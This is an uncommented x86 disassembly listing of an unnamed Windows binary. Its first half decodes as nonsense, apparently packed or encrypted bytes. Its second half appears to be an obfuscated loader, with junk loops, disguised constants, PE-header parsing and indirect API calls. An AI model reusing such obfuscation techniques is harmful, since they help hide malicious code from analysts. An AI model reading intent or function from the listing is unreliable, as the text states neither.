  4137a9:	xchg   esp,eax
  4137aa:	jb     0x41373b
  4137ac:	cdq    
  4137ad:	js     0x413769
  4137af:	cmp    DWORD PTR [edx+0x1a99d932],ecx
  4137b5:	mov    eax,ds:0x895c86e1
  4137ba:	mov    ?,edx
  4137bc:	jbe    0x413813
  4137be:	jae    0x413779
  4137c0:	pop    ecx
  4137c1:	jns    0x41382b
  4137c3:	rcl    DWORD PTR [ebp-0x7b48c5f],0xe9
  4137ca:	push   edi
  4137cb:	lods   al,BYTE PTR ds:[esi]
  4137cc:	inc    edx
  4137ce:	cmp    BYTE PTR [ecx-0x6f2055f8],dh
  4137d4:	add    BYTE PTR [edi+eax*8+0x2e],bl
  4137d8:	dec    esi
  4137d9:	rol    esi,0xdd
  4137dc:	sbb    BYTE PTR [ebp+0x3c],ch
  4137df:	out    dx,al
  4137e0:	scas   eax,DWORD PTR es:[edi]
  4137e1:	cmp    edx,DWORD PTR [ebp-0x6b03e525]
  4137e7:	mov    esp,0xfe81bb8f
  4137ec:	jecxz  0x41379f
  4137ee:	(bad)  
  4137ef:	push   ebp
  4137f0:	pop    edi
  4137f1:	enter  0x77cd,0x2a
  4137f5:	and    al,0xc7
  4137f7:	cdq    
  4137f8:	sti    
  4137f9:	and    edi,esi
  4137fb:	and    BYTE PTR [esi],cl
  4137fd:	scas   eax,DWORD PTR es:[edi]
  4137fe:	bound  eax,QWORD PTR [ebp-0x52]
  413801:	retf   
  413802:	out    dx,eax
  413803:	scas   eax,DWORD PTR es:[edi]
  413804:	push   ds
  413805:	test   al,0x45
  413807:	jge    0x4137f1
  413809:	add    eax,0x614089c6
  41380e:	frstor [esp+eiz*4-0x4d]
  413812:	cdq    
  413813:	xor    esi,ecx
  413815:	fist   DWORD PTR [edi+0x27]
  413818:	shl    DWORD PTR [edi],0x25
  41381b:	gs jl  0x41383a
  41381e:	inc    esi
  41381f:	mov    DWORD PTR [edx],eax
  413821:	sar    BYTE PTR [esi],1
  413823:	mov    edx,DWORD PTR [edx+0x2e]
  413826:	inc    ebx
  413827:	and    al,0xc0
  413829:	adc    dh,BYTE PTR ds:0xe2f8d764
  41382f:	sub    esp,DWORD PTR [edx+0x2a]
  413832:	mov    ecx,0x48e96483
  413837:	pop    ecx
  413838:	pop    ds
  413839:	inc    esi
  41383a:	test   BYTE PTR [ecx-0x77],dl
  41383d:	jge    0x4137f3
  41383f:	sbb    DWORD PTR [ecx-0x145038d3],0xffffff8c
  413846:	jno    0x413864
  413848:	sbb    DWORD PTR [ecx],ebp
  41384a:	imul   edi,eax,0xffffffa1
  41384d:	sbb    al,0x9b
  41384f:	inc    esi
  413850:	pop    esp
  413851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413852:	lea    ecx,[ecx-0x4d5e8610]
  413858:	fsub   DWORD PTR [esi]
  41385a:	cmp    bh,cl
  41385c:	iret   
  41385d:	inc    eax
  41385e:	in     al,dx
  41385f:	call   0x7117:0xaed3b09f
  413866:	xor    cl,BYTE PTR [esi-0x4a]
  413869:	xchg   ebp,eax
  41386a:	xchg   BYTE PTR [di-0x2],dh
  41386e:	(bad)  
  41386f:	push   ebp
  413870:	mov    bh,0x53
  413872:	aaa    
  413873:	(bad)  
  413875:	mov    ecx,0x34a85f06
  41387a:	cli    
  41387b:	sbb    cl,BYTE PTR [edi]
  41387d:	jecxz  0x4138a2
  41387f:	cmp    DWORD PTR [edx-0x74],ecx
  413882:	xchg   ebx,eax
  413883:	fdivr  st(7),st
  413885:	sbb    al,0xd
  413887:	xchg   ecx,eax
  413888:	inc    edi
  413889:	(bad)  
  41388a:	mov    dl,0x7c
  41388c:	hlt    
  41388d:	push   es
  41388e:	rol    BYTE PTR [ecx],0xf2
  413891:	cmp    cl,BYTE PTR ds:0x862b628d
  413897:	loop   0x413831
  413899:	retf   0xc93a
  41389c:	fwait
  41389d:	xor    DWORD PTR [edx+0x2c],eax
  4138a0:	push   cs
  4138a1:	xchg   ecx,eax
  4138a2:	stos   BYTE PTR es:[edi],al
  4138a3:	push   esp
  4138a4:	sub    esp,ebp
  4138a6:	cmp    al,0x52
  4138a8:	and    dh,ah
  4138aa:	lahf   
  4138ab:	dec    esp
  4138ac:	test   DWORD PTR [ebp+0x69c7d86a],esp
  4138b2:	xor    bl,bl
  4138b4:	rol    BYTE PTR [edx-0x34],0x55
  4138b8:	jle    0x413919
  4138ba:	jae    0x413842
  4138bc:	sbb    dh,BYTE PTR [eax+0x785c4b1e]
  4138c2:	data16 fistp DWORD PTR [ebx-0x50]
  4138c6:	lods   al,BYTE PTR ds:[esi]
  4138c7:	loopne 0x41384f
  4138c9:	xchg   DWORD PTR [edi-0x47],esp
  4138cc:	and    eax,0x14e2c8a2
  4138d1:	xchg   esi,eax
  4138d3:	enter  0x8a88,0xe7
  4138d7:	mov    esp,0xc5a1def5
  4138dc:	xor    eax,DWORD PTR [esi+0x5b9d7e32]
  4138e2:	imul   ecx,DWORD PTR [eax+0x4c],0x44e99a8a
  4138e9:	pop    ds
  4138ea:	ret    0x8cfe
  4138ed:	adc    eax,0xb629b493
  4138f2:	mov    esp,0x6c74d7e6
  4138f7:	call   0xa086:0x5b191267
  4138fe:	int3   
  4138ff:	inc    ecx
  413900:	xor    al,0x4b
  413902:	jmp    0x604e:0x10d89ab3
  413909:	fcom   QWORD PTR [ebx-0x12ad70ce]
  41390f:	jo     0x413940
  413911:	out    dx,eax
  413912:	cmp    BYTE PTR [eax],dl
  413914:	fisttp QWORD PTR [edx]
  413916:	jmp    0x413966
  413918:	andnps xmm2,XMMWORD PTR [edx+0x6542ca06]
  41391f:	push   esp
  413920:	dec    edx
  413921:	jl     0x413980
  413923:	push   cs
  413924:	addr16 push ecx
  413926:	ins    DWORD PTR es:[edi],dx
  413927:	xchg   edx,eax
  413928:	jge    0x413985
  41392a:	ja     0x413937
  41392c:	sti    
  41392d:	sub    ah,BYTE PTR [ebx-0x34669854]
  413933:	or     al,0x4f
  413935:	sbb    ecx,ecx
  413937:	xor    ebx,DWORD PTR [edx]
  413939:	adc    eax,0xce2c2ec5
  41393e:	inc    ebp
  413940:	jecxz  0x4138fb
  413942:	loopne 0x4138dc
  413944:	cld    
  413945:	sbb    eax,0x706848ba
  41394a:	inc    edx
  41394b:	jnp    0x413968
  41394d:	fwait
  41394e:	out    dx,al
  41394f:	sbb    al,0x4b
  413951:	aaa    
  413952:	out    0x59,al
  413954:	adc    al,0xd9
  413956:	mov    esi,0xb5ff2715
  41395b:	mov    eax,0xb2b9b62e
  413960:	ror    DWORD PTR [ebp-0xb],0xe8
  413964:	pop    edx
  413965:	mov    WORD PTR [edi-0x58d3c85d],ss
  41396b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41396c:	mov    ecx,0xab304312
  413971:	(bad)  
  413973:	popa   
  413974:	hlt    
  413975:	inc    BYTE PTR [esi-0x2644db38]
  41397b:	push   esp
  41397c:	inc    esp
  41397d:	les    esp,FWORD PTR [ebx-0x79cc11ac]
  413983:	jno    0x413961
  413985:	push   ecx
  413986:	pop    ebx
  413987:	sbb    esp,DWORD PTR ds:0x5388d874
  41398d:	iret   
  41398e:	xor    al,0xd1
  413990:	cmp    ecx,DWORD PTR [eax+0x4b]
  413993:	pop    esp
  413994:	ds inc ecx
  413996:	retf   0xd86
  413999:	out    0xc7,al
  41399b:	jecxz  0x4139fc
  41399d:	mov    esi,0xe22ed96a
  4139a2:	fild   DWORD PTR ds:0x10c159e0
  4139a8:	pop    fs
  4139aa:	shl    bl,1
  4139ac:	int3   
  4139ad:	push   eax
  4139ae:	inc    ebp
  4139af:	sub    bl,BYTE PTR [eax-0x49da50c1]
  4139b5:	test   eax,0x9497d33
  4139ba:	xor    ecx,DWORD PTR [ebx-0x66b4bda4]
  4139c0:	ja     0x4139f3
  4139c2:	push   ecx
  4139c3:	fsubr  DWORD PTR [ebx+ecx*8]
  4139c6:	xor    al,0x3c
  4139c8:	in     al,dx
  4139c9:	push   ds
  4139ca:	in     eax,0x9e
  4139cc:	imul   eax,DWORD PTR [eax+ebx*2],0xfffffff3
  4139d0:	cs loop 0x4139cb
  4139d3:	lds    edi,FWORD PTR [esi+0x10]
  4139d6:	lods   al,BYTE PTR ds:[esi]
  4139d7:	sub    eax,0x7a338b40
  4139dc:	mov    ds:0x620e9ee5,al
  4139e1:	clc    
  4139e2:	fild   DWORD PTR [esi]
  4139e4:	fnstcw WORD PTR [ebx]
  4139e6:	xor    eax,0x3f707172
  4139eb:	sar    BYTE PTR [ebp+0x667dccf2],0xbc
  4139f2:	sti    
  4139f3:	iret   
  4139f4:	mov    edx,0x1d099f8a
  4139f9:	dec    esi
  4139fa:	xlat   BYTE PTR ds:[ebx]
  4139fb:	ficom  DWORD PTR [ebx+0x6687b407]
  413a01:	fstp   TBYTE PTR [ebx+esi*4+0x40941fe5]
  413a08:	fistp  QWORD PTR [edi-0x7989f871]
  413a0e:	inc    esp
  413a0f:	popf   
  413a10:	mov    ch,0xf9
  413a12:	mov    edx,0xfa90c0e7
  413a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a18:	mov    esi,0xeb58f40
  413a1d:	or     BYTE PTR [edi],ch
  413a1f:	imul   ebp,esp,0xd2daf39a
  413a25:	push   ss
  413a26:	mov    WORD PTR [ecx],gs
  413a28:	daa    
  413a29:	jp     0x413a50
  413a2b:	int3   
  413a2c:	in     al,dx
  413a2d:	jmp    0xfd7:0xf8ccd3c9
  413a34:	ret    0xbf32
  413a37:	rol    BYTE PTR [esi],1
  413a39:	pop    edx
  413a3a:	add    BYTE PTR [edi],0xa5
  413a3d:	adc    al,0x11
  413a3f:	adc    DWORD PTR [esi],edx
  413a41:	out    dx,al
  413a42:	adc    eax,0xb8956901
  413a47:	nop
  413a48:	call   0x346bc173
  413a4d:	dec    eax
  413a4e:	out    dx,al
  413a4f:	xor    ecx,DWORD PTR [edx-0xbe36cde]
  413a55:	retf   0x1c8c
  413a58:	out    dx,eax
  413a59:	icebp  
  413a5a:	jecxz  0x413aa5
  413a5c:	adc    ebx,eax
  413a5e:	stc    
  413a5f:	in     eax,0xbd
  413a61:	repz mov WORD PTR [ebx+0x1c8295c3],?
  413a68:	ja     0x413aab
  413a6a:	fsubr  st,st(4)
  413a6c:	in     al,0xdc
  413a6e:	fsubr  DWORD PTR [edx-0x27]
  413a71:	(bad)  [esp+eax*2-0x382085ce]
  413a78:	or     DWORD PTR [ecx],ebx
  413a7a:	(bad)  
  413a7b:	ja     0x413ad9
  413a7d:	jp     0x413a46
  413a7f:	mov    cl,ch
  413a81:	jmp    0xa1d922ad
  413a86:	pop    ds
  413a87:	fdiv   QWORD PTR [edx-0x5c470ce3]
  413a8d:	inc    esi
  413a8e:	out    dx,eax
  413a8f:	mov    edx,0x91871d2a
  413a94:	in     al,0x45
  413a96:	(bad)  
  413a97:	test   BYTE PTR [ebp-0x16],0x2f
  413a9b:	mov    WORD PTR [ebx+0x1a],ss
  413a9e:	test   DWORD PTR [edi+0x686e09e0],0xd467a2b2
  413aa8:	cmp    dh,BYTE PTR [eax-0x1100960b]
  413aae:	es gs mov bh,0x50
  413ab2:	sub    al,0xf4
  413ab5:	pop    esi
  413ab6:	fsub   QWORD PTR [edx+0x39]
  413ab9:	adc    eax,0x13c2e692
  413abe:	dec    ecx
  413abf:	adc    eax,0xc5e991f4
  413ac4:	and    eax,0x2551ef70
  413ac9:	pop    edi
  413aca:	adc    bh,BYTE PTR [esi]
  413acc:	push   eax
  413acd:	fld    QWORD PTR [eax+0x53]
  413ad0:	dec    esp
  413ad1:	jp     0x413b45
  413ad3:	das    
  413ad4:	pop    es
  413ad5:	ss jno 0x413b1a
  413ad8:	add    eax,0x1355bf61
  413add:	aam    0xa1
  413adf:	popf   
  413ae0:	mov    eax,0xb53e0b27
  413ae5:	daa    
  413ae6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae7:	adc    BYTE PTR [edx-0x1df6478],ah
  413aed:	in     eax,0x6e
  413aef:	call   0x6379:0x6f3b0e4a
  413af6:	imul   edx,DWORD PTR [ecx],0xffffffa7
  413af9:	stos   BYTE PTR es:[edi],al
  413afa:	int3   
  413afb:	or     ecx,ecx
  413afd:	scas   al,BYTE PTR es:[edi]
  413afe:	test   eax,0x294c95b9
  413b03:	push   ebp
  413b04:	push   cs
  413b05:	jle    0x413b07
  413b07:	daa    
  413b08:	daa    
  413b09:	rcl    BYTE PTR [ecx-0x2b5830b8],1
  413b0f:	das    
  413b10:	and    dl,0xfb
  413b13:	into   
  413b14:	xor    DWORD PTR [esi+0x69032cfa],edx
  413b1a:	push   esi
  413b1b:	add    bh,BYTE PTR [esi+edi*8+0x7f]
  413b1f:	pop    edi
  413b20:	and    edi,DWORD PTR [ebx-0x97086d9]
  413b26:	retf   
  413b27:	popa   
  413b28:	adc    esi,DWORD PTR [edx]
  413b2a:	fcom   DWORD PTR [ebp+0x5d20a67a]
  413b30:	adc    DWORD PTR [ecx],eax
  413b32:	xor    ah,BYTE PTR [ecx+eax*1]
  413b35:	test   eax,0x903fd102
  413b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b3b:	sub    dh,BYTE PTR [edx+0x77]
  413b3e:	test   DWORD PTR [eax],esp
  413b40:	out    dx,al
  413b41:	xlat   BYTE PTR ds:[ebx]
  413b42:	jecxz  0x413b25
  413b44:	sub    edx,DWORD PTR [eax]
  413b46:	nop
  413b47:	ror    BYTE PTR [esi-0x55],0x58
  413b4b:	push   es
  413b4c:	add    edi,DWORD PTR [eax+0x2a]
  413b4f:	sbb    DWORD PTR [esi*1+0x755ca51e],ebp
  413b56:	add    ecx,ebp
  413b58:	imul   ecx,DWORD PTR [eax+0xb],0xffffffa2
  413b5c:	add    BYTE PTR [esi],ch
  413b5e:	es jne 0x413b99
  413b61:	sub    edx,ebp
  413b63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b64:	xor    eax,0xc6e20967
  413b69:	push   0x6c
  413b6b:	stc    
  413b6c:	dec    ebp
  413b6d:	mov    ecx,0x8e86fdd8
  413b72:	xor    DWORD PTR gs:[eax],ebp
  413b75:	in     al,dx
  413b76:	jp     0x413b74
  413b78:	ficom  WORD PTR [esi-0x72]
  413b7b:	xchg   edx,eax
  413b7c:	stos   DWORD PTR es:[edi],eax
  413b7d:	cmp    al,0xd5
  413b7f:	adc    eax,0x2ef5e212
  413b84:	pushf  
  413b85:	mov    cl,0x40
  413b87:	arpl   dx,ax
  413b89:	and    DWORD PTR [ebp-0x75],edi
  413b8c:	sahf   
  413b8d:	fcom   DWORD PTR [ecx-0xd]
  413b90:	inc    edi
  413b91:	ficomp WORD PTR [esi-0x28a1c4c1]
  413b97:	fisubr WORD PTR [edi+eiz*4-0x1c97f7f]
  413b9e:	xchg   esp,eax
  413b9f:	pop    es
  413ba0:	es adc al,0x9
  413ba3:	add    cl,BYTE PTR [edi+0x2dfcab1c]
  413ba9:	xor    edx,DWORD PTR [eax+0x38e0f486]
  413baf:	shl    DWORD PTR [ebp-0x27d03405],0xff
  413bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bb7:	cs cmc 
  413bb9:	shl    BYTE PTR [edi-0x6f],0x5d
  413bbd:	push   cs
  413bbe:	aaa    
  413bbf:	rol    BYTE PTR [eax],cl
  413bc1:	or     DWORD PTR [esi-0x7f3b9431],esi
  413bc7:	cmove  edi,DWORD PTR [ebp-0x54a0544c]
  413bce:	jbe    0x413c07
  413bd0:	outs   dx,DWORD PTR ds:[esi]
  413bd1:	jge    0x413bc7
  413bd3:	push   esp
  413bd4:	lods   al,BYTE PTR ds:[esi]
  413bd5:	push   edx
  413bd6:	xlat   BYTE PTR ds:[ebx]
  413bd7:	dec    esi
  413bd8:	jmp    0xb256ce2
  413bdd:	mov    ebx,0xb93cf919
  413be2:	hlt    
  413be3:	push   0x6b
  413be5:	in     al,0x33
  413be7:	ja     0x413c2c
  413be9:	add    edx,ecx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
  4141a2:	xor    DWORD PTR [eax],esi
  4141a4:	mov    eax,DWORD PTR [ebp-0x4]
  4141a7:	mov    edi,DWORD PTR [ebp+0x10]
  4141aa:	xor    edi,ecx
  4141ac:	mov    esi,0xffcd8d25
  4141b1:	mov    ebx,esi
  4141b3:	sub    ebx,edi
  4141b5:	add    DWORD PTR [eax],ebx
  4141b7:	mov    eax,DWORD PTR [ebp-0x4]
  4141ba:	mov    edi,DWORD PTR [ebp-0x8]
